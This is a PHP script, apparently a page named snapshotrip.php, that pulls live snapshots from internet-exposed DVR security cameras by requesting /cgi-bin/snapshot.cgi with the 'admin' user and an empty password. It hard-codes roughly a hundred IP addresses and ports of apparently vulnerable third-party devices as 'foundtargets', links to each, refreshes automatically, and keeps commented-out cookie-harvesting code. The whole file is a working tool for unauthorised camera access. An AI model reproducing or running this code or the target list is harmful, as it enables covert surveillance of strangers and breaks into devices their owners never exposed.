<?php 

$ip = $_GET['ip'];
$sleep= $_GET['sleep'];
$curlurl="http://$ip/";

// open a site with cookies
// $ch = curl_init();
// curl_setopt($ch, CURLOPT_URL, $curlurl);
// curl_setopt($ch, CURLOPT_USERAGENT, 'Mofo the hacker/5.0 (Windows NT -43.1; rv:11.0) Gek yo/20100101 Firefart/0.0.1');
// curl_setopt($ch, CURLOPT_HEADER  ,1);
// curl_setopt($ch, CURLOPT_RETURNTRANSFER  ,1);
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION  ,1);
// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
// curl_setopt($ch, CURLINFO_HEADER_OUT, true); // enable tracking
// $result = curl_exec($ch);
// // request headers
// $cookies = curl_getinfo($ch, CURLINFO_COOKIELIST);

// $header = curl_getinfo($ch, CURLINFO_HEADER_OUT)); 
// get cookies
// $cookies = array();
// preg_match_all('/Set-Cookie:(?dvr_*\s{0,}.*)$/im', $result, $cookies);

// print_r($cookies['cookie']); // show harvested cookies
// //var_dump($cookies['cookie']);
// // basic parsing of cookie strings (just an example)
// $cookieParts = array();
// preg_match_all('/Set-Cookie:\s{0,}(?Pdvr_[^=]*)=(?P<value>[^;]*).*?expires=(?P<expires>[^;]*).*?path=(?P<path>[^;]*).*?domain=(?P<domain>[^\s;]*).*?$/im', $content, $cookieParts);
// //print_r($cookieParts);
//var_dump($cookies);

if ($sleep < 9000){
	$sleep = 9000;
}
$foundtargets=array("123.205.116.236:80","171.246.102.190:80","151.74.128.10","93.46.104.168:81","31.168.191.204:83","85.105.54.200:81","80.1.195.28:80","98.252.196.32:80","91.222.199.146:9944","5.68.182.206:80","1.52.143.136:81","87.3.154.222:80","105.184.64.121:80","41.182.207.68:80","82.15.240.87:80","85.105.46.150:80","14.182.137.120:8000","88.251.144.200:5000","14.181.200.92:83","42.200.170.72:5000","179.179.61.53:8090","218.161.127.8:80","217.255.110.153:80","41.79.207.125:88","113.176.62.25:81","78.186.126.139:80","90.90.166.132:80","176.217.100.93:80","171.246.102.190:80","5.102.180.193:80","79.46.89.46:80","5.74.251.124:80","88.234.11.192:5000","197.51.110.192:80","151.74.128.10:80","121.122.74.197:51106","61.5.82.127:7777","145.133.138.198:8080","151.65.141.31:80","128.65.176.232:80","87.103.240.173:80","171.247.171.83:80","89.118.101.2:80","14.243.131.8:81","190.73.101.225:8000","84.241.28.146:80","88.249.244.102:81","175.136.188.237:80","171.250.196.117:8080","37.255.242.17:80","178.89.61.111:80","200.146.58.157:80","151.70.41.13:8080","79.192.227.130:8080","88.91.0.27:80","78.188.234.214:5000","171.250.114.111:80","27.130.162.173:81","141.135.231.87:8080","88.231.51.128:80","186.210.216.1:8888","180.241.155.69:8010","176.185.6.82:80","95.137.174.162:8000","103.249.209.148:8001","84.94.114.184:80","103.253.150.221:80","81.29.243.93:88","82.55.137.19:80","202.160.18.177:80","37.34.246.243:83","79.6.175.51:80","180.241.155.69:3542","14.185.192.192:82","197.51.12.155:80","91.234.2.122:8090","36.75.105.233:8000","37.34.237.18:8080","94.159.141.147:80","94.74.175.21:3541","62.219.226.182:80","81.16.119.49:80","78.134.80.220:8080","73.121.248.161:9080","109.193.43.75:80","78.163.234.177:80","192.117.129.17:80","14.162.147.231:81","5.160.173.165:80","45.52.52.234:80","121.216.99.69:80","89.107.92.243:8080","212.179.99.133:80","93.55.176.4:80","82.137.243.35:80","36.72.250.63:80","78.189.116.231:8080","169.0.88.140:81","81.218.203.122:80","78.134.56.132:80","151.74.135.185:8080","37.255.241.139:13579","182.253.189.146:88");

$found_qty_streams=array("91.222.199.146:9944"=>"16","123.205.116.236:80"=>"4");
echo "Refresh every : ".$sleep."</br>";

//echo " Usage! http://electroman.nl/snapshotrip.php?ip=5.74.91.54&sleep=500000</br>";
$arrsize = count($foundtargets);
echo "dvr's : ".$arrsize;
echo "</br>";
echo '<a href="http://electroman.nl/snapshotrip.php?sleep=9000&ip='.$ip.'" target="_self">'.$ip.'</a></br>';

	if(array_key_exists($ip, $found_qty_streams) == 1){

	        $qty_streams = $found_qty_streams[$ip];
	}else{
		$qty_streams = 2;
	}
	for ($i=0; $i < $qty_streams; $i++){
		echo '<img  width=300px src="http://'.$ip.'/cgi-bin/snapshot.cgi?chn='.$i.'&u=admin&p=&q=0&d=0" /></br>';
	}

?>
<!-- 
<img  width=300px src="http://<?php echo $ip; ?>/cgi-bin/snapshot.cgi?chn=0&u=admin&p=&q=0&d=0" /></br>
<img  width=300px src="http://<?php echo $ip; ?>/cgi-bin/snapshot.cgi?chn=1&u=admin&p=&q=0&d=1" /></br>
<img  width=300px src="http://<?php echo $ip; ?>/cgi-bin/snapshot.cgi?chn=2&u=admin&p=&q=0&d=1" /></br>
<img  width=300px src="http://<?php echo $ip; ?>/cgi-bin/snapshot.cgi?chn=3&u=admin&p=&q=0&d=1" /></br>
<img  width=300px src="http://<?php echo $ip; ?>/cgi-bin/snapshot.cgi?chn=4&u=admin&p=&q=0&d=1" /></br>
<img  width=300px src="http://<?php echo $ip; ?>/cgi-bin/snapshot.cgi?chn=5&u=admin&p=&q=0&d=1" /></br>
<img  width=300px src="http://<?php echo $ip; ?>/cgi-bin/snapshot.cgi?chn=6&u=admin&p=&q=0&d=1" /></br>
<img  width=300px src="http://<?php echo $ip; ?>/cgi-bin/snapshot.cgi?chn=7&u=admin&p=&q=0&d=1" /></br>
<img  width=300px src="http://<?php echo $ip; ?>/cgi-bin/snapshot.cgi?chn=8&u=admin&p=&q=0&d=1" /></br> -->
<?php
echo '<a href="http://electroman.nl/snapshotrip.php?sleep=9000&ip='.$ip.'" target="_self">'.$ip.'</a></br>';
foreach($foundtargets as $targetdvr){

	//echo '<a href="http://electroman.nl/snapshotrip.php?sleep=9000&ip='.$targetdvr.'" target="_self">'.$targetdvr.'</a></br>';
	echo 'Look for dvr on ip : <a href="http://electroman.nl/snapshotrip.php?sleep=9000&ip='.$targetdvr.'" target="_self">'.$targetdvr.'</a></br></br>';
}
?>
<script>
	// sleep time expects milliseconds
	function sleep (time) {
	  	return new Promise((resolve) => setTimeout(resolve, time));
	}

	sleep(<?php echo $sleep; ?>).then(() => {
    // Do something after the sleep!
	location.reload();
});
</script>

</html>